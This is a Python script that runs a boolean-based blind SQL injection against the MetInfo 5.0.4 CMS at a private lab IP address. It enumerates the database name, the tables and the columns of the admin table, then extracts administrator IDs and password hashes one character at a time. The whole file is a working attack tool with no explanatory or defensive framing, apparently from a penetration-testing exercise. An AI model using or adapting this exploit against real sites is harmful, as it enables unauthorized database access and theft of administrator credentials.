#coding=utf-8
import re
from this import d
import requests as req
import string
'''
and length(database())=1
and ascii(substr(database(),1,1))>1
'''
char_s=string.printable.strip()
db_name=""
db_length=0
table_name=""
column_name=""
cont=""
url="http://192.168.111.129/MetInfo5.0.4/about/show.php?lang=cn&id=22"
for i in range(1,1001):
    payload= f" and length(database()) = {i}"
    full_url=url+payload
    if "location.href='../404.html';" not in req.get(full_url).text:
        print(f"数据库名字长度为{i}")
        db_length=i
        break
for i in range(1,db_length+1):
    for z in char_s:
        payload= f" and ascii(substr(database(),{i},1))={ord(z)}"
        full_url=url+payload
        if "location.href='../404.html';" not in req.get(full_url).text:
            print(f"数据库名字第{i}为{z}")
            db_name+=z
            break
print(f"数据库名字为 {db_name}")
for i in range(1,10001):
    payload= f" and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={i}"
    full_url=url+payload
    if "location.href='../404.html';" not in req.get(full_url).text:
        ta_name_length=i
        break
for i in range(1,ta_name_length+1):
    for z in char_s:
        payload= f" and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))={ord(z)}"
        full_url=url+payload
        if "location.href='../404.html';" not in req.get(full_url).text:
            print(f"数据库中所有表名第{i}为{z}")
            table_name+=z
            break
print(f"数据库中的表有{table_name}")
for i in range(1,10001):
    payload= f" and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65))={i}"
    full_url=url+payload
    if "location.href='../404.html';" not in req.get(full_url).text:
        con_name_length=i
        break
for i in range(1,con_name_length):
    for q in char_s:
        payload= f" and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65),{i},1)) = {ord(q)}"
        full_url=url+payload
        if "location.href='../404.html';" not in req.get(full_url).text:
            print(f"数据库中所有字段名第{i}为{q}")
            column_name+=q
            break
print(f"数据库中的字段{column_name}")
for i in range(1,10001):
    payload= f" and length((select group_concat(admin_id,0x3a,admin_pass) from met_admin_table))={i}"
    full_url=url+payload
    if "location.href='../404.html';" not in req.get(full_url).text:
        con_length=i
        break
for i in range(1,con_length+1):
    for q in char_s:
        payload= f" and ascii(substr((select group_concat(admin_id,0x3a,admin_pass) from met_admin_table),{i},1)) = {ord(q)}"
        full_url=url+payload
        if "location.href='../404.html';" not in req.get(full_url).text:
            print(f"数据库中账号和密码第{i}为{q}")
            cont+=q
            break
print(f"数据库中的字段{cont}")


    

           